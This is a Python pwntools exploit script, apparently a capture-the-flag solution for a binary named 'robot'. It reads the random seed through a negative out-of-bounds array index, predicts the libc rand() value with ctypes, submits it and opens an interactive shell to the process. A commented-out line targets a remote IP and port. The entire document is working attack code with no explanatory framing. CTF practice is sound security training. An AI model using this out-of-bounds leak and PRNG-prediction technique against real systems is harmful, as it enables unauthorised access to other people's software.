from pwn import *
from ctypes import CDLL

context.binary = './robot'
context.log_level = 'error'

libc = CDLL("./libc.so.6")

def predict(seed):
    libc.srand(seed & 0xffffffff)
    return libc.rand() % 10000


p = process("./robot")
#p = remote("20.199.41.155",5051)
"""
1. Calculate offset to seed
"""
array_offset = 0x30
seed_offset = 0x40
index = (array_offset - seed_offset) // 4 # -4


"""
2. Leak seed
"""
p.recvuntil(b'Which Value Would You Like To Inspect?')
p.sendline(str(index))

p.recvuntil(f'Value Stored in {index} is ')
seed = int(p.recvline()[:-3])
secret = predict(seed)

"""
3. Print flag
"""
p.recvuntil(b'Enter The Speed:')
p.sendline(str(secret))

p.interactive()
